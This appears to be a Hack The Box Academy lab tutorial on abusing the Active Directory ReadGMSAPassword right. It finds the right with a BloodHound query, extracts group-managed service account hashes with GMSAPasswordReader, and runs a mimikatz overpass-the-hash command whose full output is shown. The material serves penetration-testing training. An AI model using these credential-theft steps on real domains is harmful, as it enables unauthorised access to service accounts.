
---
---
## ReadGMSAPassword

`Group Managed Service Accounts` (`gMSAs`) is a feature in Microsoft Active Directory that provides a secure and automated mechanism for managing service accounts used by applications and services running on Windows servers. Unlike regular service accounts, `gMSAs` have built-in password management and simplified key distribution, eliminating the need to manage and update passwords manually.

When a `gMSA` is created, it is associated with a specific Active Directory group, allowing multiple servers or applications to share the same `gMSA` for authentication. This association simplifies the administration and maintenance of service accounts across multiple systems.

A `gMSA` leverages a `secure key distribution process`, where the password is `automatically generated`, `securely stored`, and `periodically rotated` by the Active Directory domain controller. This eliminates the risk of the password being compromised or forgotten, reducing the attack surface and enhancing security.

By utilizing `gMSAs`, the associated principals (such as machine accounts, servers, or applications) are granted specific access rights through the use of a dedicated `DACLs` stored in the `msDS-GroupMSAMembership` attribute of the service account. These access rights can be tailored to meet the specific requirements of each principal, granting them access to the necessary resources and reducing the need for manual permission management.

If we get access to a principal (such as machine accounts, servers, or applications) that have access rights to use a `gMSA`, we can abuse it to obtain the group-managed service account password.

[dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) does not allow enumeration of this privilege. Therefore, let us use `BloodHound` to identify/enumerate it using a cypher query:

```cypher
MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p
```

![read_gmsa_bloodhound.jpg](https://academy.hackthebox.com/storage/modules/219/read_gmsa_bloodhound.jpg)

`BloodHound` establishes a path revealing that `Pedro` actively possesse the access right `ReadGMSAPassword` over three `gMSAs` accounts. This path signifies `Pedro`'s direct authority and control over these accounts, meaning we can use his account to retrieve those passwords.

## Abusing ReadGMSAPassword from Windows

A viable method for actively obtaining the password of the `GMSA` from Windows and converting it into its corresponding hashes involves using the [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) tool. This tool operates by reading the password blob from a `gMSA` account using LDAP and subsequently parsing the values into reusable hashes. After launching a `cmd.exe` as `Pedro` we can use this tool as follow:

> Executing GMSAPasswordReader

```c
C:\Tools> whoami

inlanefreight\pedro
C:\Tools> GMSAPasswordReader.exe --accountname apache-dev
```

It is important to note that this action may yield multiple hashes, including one for the `old password` and another for the `current password`. It is worth considering that either of these values could be valid for subsequent operations.

Once the hashes has been obtained, it can be used similarly to a regular user account. Techniques such as `pass-the-hash` (`PtH`) or `overpass-the-hash` (`OtH`) can be performed, leveraging the hash as an input for various offensive operations.

Let's use mimikatz, located in `C:\Tools`, to perform an OverPass the Hash attack. The following command will open a PowerShell window that will contain the ticket of the GMSA account `apache-dev$`:

> Using Mimikatz to perform OverPass-the-Hash

```c
 mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > [https://blog.gentilkiwi.com/mimikatz](https://blog.gentilkiwi.com/mimikatz)
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > [https://pingcastle.com](https://pingcastle.com/) / [https://mysmartlogon.com](https://mysmartlogon.com/) ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
user    : apache-dev$
domain  : inlanefreight.local
program : powershell.exe
impers. : no
NTLM    : 69978088B44350772FEBDB1E3DAC6F39
  |  PID  5276
  |  TID  7888
  |  LSA Process is now R/W
  |  LUID 0 ; 30799197 (00000000:01d5f55d)
  \_ msv1_0   - data copy @ 0000029A02E0AC80 : OK !
  \_ kerberos - data copy @ 0000029A03349848
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000029A0329C168 (32) -> null

mimikatz(commandline) # exit
Bye!
```

---
---
